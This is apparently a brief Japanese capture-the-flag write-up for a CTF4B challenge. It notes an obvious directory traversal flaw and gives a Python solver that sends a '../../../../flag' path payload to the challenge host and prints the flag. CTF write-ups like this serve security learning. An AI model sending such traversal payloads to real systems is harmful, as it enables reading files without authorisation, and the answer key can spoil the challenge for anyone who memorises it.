自明な Directory Traversal 脆弱性があるので、問題文で指定されたファイルを読むだけ。

```python
import requests
import os

def main():
    response = requests.get(
        f"http://{os.getenv('CTF4B_HOST')}:{os.getenv('CTF4B_PORT')}/?page=../../../../flag",
    )
    print(f"[*] FLAG: {response.text}")

if __name__ == '__main__':
    main()
```
